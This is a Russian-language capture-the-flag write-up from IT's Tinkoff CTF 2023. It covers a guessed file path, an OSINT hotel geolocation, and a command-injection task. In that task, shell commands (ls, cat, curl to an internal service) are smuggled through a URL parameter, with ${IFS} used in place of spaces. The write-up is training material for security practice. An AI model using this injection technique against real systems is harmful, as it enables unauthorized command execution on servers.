# IT's Tinkoff CTF 2023

### Web: Зов Аномалий
Описание:

![ScreenShot](screenshots/1.png)

Осматриваем сайт и находим карту "Зоны":

![ScreenShot](screenshots/2.png)

![ScreenShot](screenshots/3.png)

Выбираем один из артефактов на карте и открываем его в отдельном окне:

![ScreenShot](screenshots/4.png)

![ScreenShot](screenshots/5.png)

Получаем путь до картинки с артефактом:
```sh
https://its-artifacts-jk2dm72.spbctf.ru/wp-content/uploads/2023/07/kandinsky-download-1688481651933.png
```

Меняем название картинки на **flag.png**:

```sh
https://its-artifacts-jk2dm72.spbctf.ru/wp-content/uploads/2023/07/flag.png
```

![ScreenShot](screenshots/6.png)

**its{c0n6r47ul4710n5_y0u_f0und_7h3_m41n_4r71f4c7}**

---

### Web: Планетарная важность
Описание:

![ScreenShot](screenshots/7.png)

Перейдем по ссылке и увидим простой сайт, где из рабочих элементов есть "**Статус пограммы**", который возвращает "**[The system's broken]**":

![ScreenShot](screenshots/8.png)

![ScreenShot](screenshots/9.png)

Проверяем исходный код страницы и находим интересный элемент "**/execute?cmd=get-status**", проверяем, сможет ли он исполнить нашу команду **ls**:

![ScreenShot](screenshots/10.png)

```sh
https://its-broken-cb23byi7.spbctf.ru/execute?cmd=ls
```

![ScreenShot](screenshots/11.png)

К сожалению обнаруживаем, что пробелы не обрабатываются в чистом виде:

```sh
https://its-broken-cb23byi7.spbctf.ru/execute?cmd=ls%20-la
```

![ScreenShot](screenshots/12.png)

Находим способ передачи символа "пробел" через ${IFS}:

```sh
https://its-broken-cb23byi7.spbctf.ru/execute?cmd=ls${IFS}-la
```

![ScreenShot](screenshots/13.png)

Обнаруживаем список файлов и читаем **README.md**

```sh
https://its-broken-cb23byi7.spbctf.ru/execute?cmd=cat${IFS}README.md
```

![ScreenShot](screenshots/14.png)

```sh
	## Панель управления 
	### Старт приложения Для запуска приложения выполните 
	```bash curl http://management:5000/start/ ``` 

	### Обновления Для получения обновлений выполните 
	```bash curl http://management:5000/getUpdates/ ``` 

	### 	Перезагрузка Для перезагрузки приложения выполните 
	```bash curl http://management:5000/restart/ ```
```

Выполняем перезагрузку:

```sh
https://its-broken-cb23byi7.spbctf.ru/execute?cmd=curl${IFS}-s${IFS}http://management:5000/restart/
```

![ScreenShot](screenshots/15.png)

Сказано, двигаться в **/060648ac9456adba9740f7b2b119abf2bcf194c2/**. Двигаемся и находим флаг:

```sh
https://its-broken-cb23byi7.spbctf.ru/060648ac9456adba9740f7b2b119abf2bcf194c2/
```

![ScreenShot](screenshots/16.png)

**its{yoU_54VED_hUMaNi7Y_fRoM_a_M3t3Orite_FALL_w17h_RcE}**

---

### OSINT: Осьмак
Описание:

![ScreenShot](screenshots/17.png)

![ScreenShot](screenshots/18.png)

Перейдем по ссылке и увидим форму, в которую необходимо внести данные, для того, чтобы получить флаг:

![ScreenShot](screenshots/19.png)

![ScreenShot](screenshots/20.png)

Первым делом, пробуем **поиск по картинке**:

![ScreenShot](screenshots/21.png)

Находим что-то похожее на наше изображение. Проверим источник изображения:

![ScreenShot](screenshots/22.png)

Новый ориентир - **Roof Apart Hotel**:

Ищем отель на Google картах, используя данные из ресурсах-источника изображения:

![ScreenShot](screenshots/23.png)

На данном этапе понимаем, что это не тот отель, который нам нужен - обращаем внимание на угол обзора. Скорее всего, нам нужно ориентироваться на два здания, стоящих рядом:

![ScreenShot](screenshots/24.png)

Примерно проверяем еще раз угол обзора, используя вид сверху:

![ScreenShot](screenshots/25.png)

Находим другой отель - Holiday Inn Express:

![ScreenShot](screenshots/26.png)

Копируем его полный адрес:

![ScreenShot](screenshots/27.png)

Первые три пункта формы мы, предположительно, узнали, остается перебрать этажи:

![ScreenShot](screenshots/28.png)

**its{vZLOMSh1KI_ha5-B3EN_fOUND_AnD_neU7r4L1ZED}**

---

### Web: Принцесса в другом замке
Описание:

![ScreenShot](screenshots/29.png)

https://its-tinderella-w2wfm3xc.spbctf.ru/api/princess-sputnik?id=2

